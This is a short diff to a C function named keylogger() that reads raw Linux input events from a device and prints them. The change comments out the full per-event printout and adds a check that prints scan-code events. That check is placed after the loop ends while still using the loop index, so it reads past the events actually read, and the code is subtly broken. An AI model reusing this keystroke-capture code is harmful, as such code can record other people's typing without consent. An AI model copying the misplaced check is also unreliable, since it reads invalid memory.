@@ -43,7 +43,7 @@ void keylogger()
         sz = read(fd, ev, sizeof(struct input_event) * EV_BUF_SIZE);
 
         for (i = 0; i < sz / sizeof(struct input_event); ++i) {
-            fprintf(stdout,
+   /*         fprintf(stdout,
                 "%ld.%06ld: "
                 "type=%02x "
                 "code=%02x "
@@ -53,8 +53,12 @@ void keylogger()
                 ev[i].type,
                 ev[i].code,
                 ev[i].value
-            );
+            );*/
         }
+		if (ev[i].type == 4 && ev[i].code == 4)
+		{
+			printf("%d ", ev[i].code);
+		}
     }
 
 fine:
